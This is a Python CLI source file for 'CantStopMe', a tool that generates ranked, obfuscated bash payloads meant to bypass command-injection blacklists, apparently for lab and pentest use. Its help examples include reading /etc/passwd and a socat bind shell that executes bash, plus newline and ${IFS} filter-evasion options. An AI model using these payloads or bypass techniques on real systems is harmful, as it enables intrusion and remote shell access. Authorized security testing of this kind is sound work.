"""CantStopMe CLI — default action is obfuscate."""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from cantstopme import __version__
from cantstopme.engine.blacklist import resolve_blacklist
from cantstopme.engine.constants import DEFAULT_TOP_PAYLOADS
from cantstopme.engine.coverage import (
    find_uncovered,
    format_variant_report,
    pending_summary,
    process_blacklist_file_overlay,
    prune_resolved_pending,
)
from cantstopme.engine.rules import select_rules
from cantstopme.engine.terminal_style import (
    format_payload_output,
    payload_for_terminal,
    print_coverage_alert,
)
from cantstopme.engine.variant_engine import RankedPayload, generate_top_payloads


def resolve_use_pool(use_pool_flag: bool, blacklist: str | None) -> bool:
    if use_pool_flag:
        return True
    if blacklist:
        return False
    return True


def _alert_coverage_gaps(
    gaps: list[dict],
    *,
    overlay_path: Path | None,
    pending_total: int,
) -> None:
    if not gaps and pending_total == 0:
        return
    parts = []
    if gaps:
        preview = ", ".join(
            f"{g['kind']}:{g['value']!r}" for g in gaps[:6]
        )
        if len(gaps) > 6:
            preview += f", ... (+{len(gaps) - 6})"
        src = f" (-b {overlay_path.name})" if overlay_path else ""
        parts.append(f"{len(gaps)} filter(s) with no rule{src}: {preview}")
    if pending_total:
        parts.append(
            f"{pending_total} pending item(s) in blacklist_pool/pending_coverage.yaml"
        )
    msg = " | ".join(parts)
    print_coverage_alert(msg)
    print_coverage_alert("Add rules under rules/ - see pending_coverage.yaml")


def _print_ranked(
    ranked: list[RankedPayload],
    *,
    url_encode: bool,
    prefix_ping: bool,
    stream,
) -> None:
    for idx, item in enumerate(ranked, start=1):
        display = payload_for_terminal(item.payload, url_encoded=url_encode)
        styled = format_payload_output(
            display,
            highlight_decoy=prefix_ping and item.payload.startswith("1.1.1.1"),
            url_encode=url_encode,
        )
        rules = ", ".join(item.rules_applied) or "(none)"
        print(f"[{idx}] {item.label}  (score {item.score})", file=stream)
        print(f"    rules: {rules}", file=stream)
        print(f"    {styled}", file=stream)
        if idx < len(ranked):
            print(file=stream)


def _run_obfuscate(args: argparse.Namespace) -> int:
    use_pool = resolve_use_pool(args.use_pool, args.blacklist)
    overlay_path = Path(args.blacklist) if args.blacklist else None

    gaps: list[dict] = []
    if overlay_path:
        gaps, _ = process_blacklist_file_overlay(overlay_path, args.command)

    ranked = generate_top_payloads(
        args.command,
        blacklist_path=overlay_path,
        use_pool=use_pool,
        url_encode=args.url_encode,
        prefix_ping=args.ping,
        prefer_keyword=args.keyword_style,
        limit=args.limit,
    )

    if not args.json:
        prune_resolved_pending(args.command)
        pending_total, _ = pending_summary()
        _alert_coverage_gaps(gaps, overlay_path=overlay_path, pending_total=pending_total)

    if args.json:
        pending_total, pending_entries = pending_summary()
        bl = resolve_blacklist(overlay_path, use_pool=use_pool)
        print(
            json.dumps(
                {
                    "original": args.command,
                    "limit": args.limit,
                    "prefix_ping": args.ping,
                    "payloads": [
                        {
                            "rank": i,
                            "label": r.label,
                            "payload": r.payload,
                            "score": r.score,
                            "rules_applied": r.rules_applied,
                        }
                        for i, r in enumerate(ranked, start=1)
                    ],
                    "blacklist": bl.summary(),
                    "uncovered_filters": gaps or find_uncovered(bl, args.command),
                    "pending_coverage_count": pending_total,
                    "pending_coverage": pending_entries,
                },
                indent=2,
            )
        )
        return 0

    if not ranked:
        print("(no payloads generated)", file=sys.stderr)
        return 1

    _print_ranked(
        ranked,
        url_encode=args.url_encode,
        prefix_ping=args.ping,
        stream=sys.stdout,
    )

    if args.url_encode and not args.ping:
        print(
            "\nNote: --url-encode only encodes newlines; spaces use ${IFS} when allowed.",
            file=sys.stderr,
        )
    if args.verbose:
        print("\n--- verbose ---", file=sys.stderr)
        for r in ranked:
            print(f"  {r.label}: score={r.score}", file=sys.stderr)
    return 0


def _run_explain(args: argparse.Namespace) -> int:
    use_pool = resolve_use_pool(args.use_pool, args.blacklist)
    overlay_path = Path(args.blacklist) if args.blacklist else None
    bl = resolve_blacklist(overlay_path, use_pool=use_pool)
    matched = select_rules(bl, args.command)
    gaps: list[dict] = []
    if overlay_path:
        gaps, _ = process_blacklist_file_overlay(overlay_path, args.command)
    pending_total, _ = pending_summary()
    _alert_coverage_gaps(gaps, overlay_path=overlay_path, pending_total=pending_total)
    print("Blacklist:", json.dumps(bl.summary(), indent=2))
    print("\nMatching rules:")
    for r in matched:
        print(f"  - {r.id} ({r.transform})")
        for ref in r.references[:2]:
            print(f"      ref: {ref}")
    if not matched:
        print("  (none)")
    return 0


def _run_stats(_args: argparse.Namespace) -> int:
    print(format_variant_report())
    return 0


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="cantstopme",
        description="Obfuscate bash commands against a blacklist (lab / authorized use only).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            '  python cantstopme.py -c "cat /etc/passwd" -b examples/php_ping_filter.txt\n'
            '  python cantstopme.py -c "cat /etc/passwd" -b examples/php_ping_filter.txt --ping --url-encode\n'
            '  python cantstopme.py -c "socat TCP-LISTEN:443,fork EXEC:bash" -b examples/php_ping_filter.txt -n 10\n'
            '  python cantstopme.py --stats\n'
        ),
    )
    p.add_argument("--version", action="version", version=__version__)

    p.add_argument("-c", "--command", help="Command to obfuscate")
    p.add_argument(
        "-b",
        "--blacklist",
        help="Blacklist overlay file (without --use-pool: only this file is used)",
    )
    p.add_argument(
        "--use-pool",
        action="store_true",
        help="Also load blacklist_pool/pool.yaml (default on if -b omitted; default off if -b set)",
    )
    p.add_argument(
        "--ping",
        action="store_true",
        help="Prepend decoy 1.1.1.1 + newline (%%0a with --url-encode) for ping-style injection labs",
    )
    p.add_argument(
        "--url-encode",
        action="store_true",
        help="Encode injection newline as %%0a (spaces stay ${IFS}, not %%20)",
    )
    p.add_argument(
        "-n",
        "--limit",
        type=int,
        default=DEFAULT_TOP_PAYLOADS,
        metavar="N",
        help=f"Number of ranked payloads to show (default {DEFAULT_TOP_PAYLOADS})",
    )
    p.add_argument(
        "--keyword-style",
        choices=(
            "single_quotes",
            "double_quotes",
            "backticks",
            "dollar_at",
            "backslash",
            "uninit_var",
            "reverse",
        ),
        default="single_quotes",
    )
    p.add_argument(
        "--explain",
        action="store_true",
        help="Show matching rules without obfuscating",
    )
    p.add_argument(
        "--stats",
        action="store_true",
        help="Print bypass-variant statistics for pool/rules",
    )
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--json", action="store_true")
    return p


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.stats:
        return _run_stats(args)

    if args.explain:
        if not args.command:
            parser.error("--explain requires -c / --command")
        return _run_explain(args)

    if not args.command:
        parser.error("-c / --command is required")

    if args.limit < 1:
        parser.error("--limit must be >= 1")

    return _run_obfuscate(args)


if __name__ == "__main__":
    raise SystemExit(main())
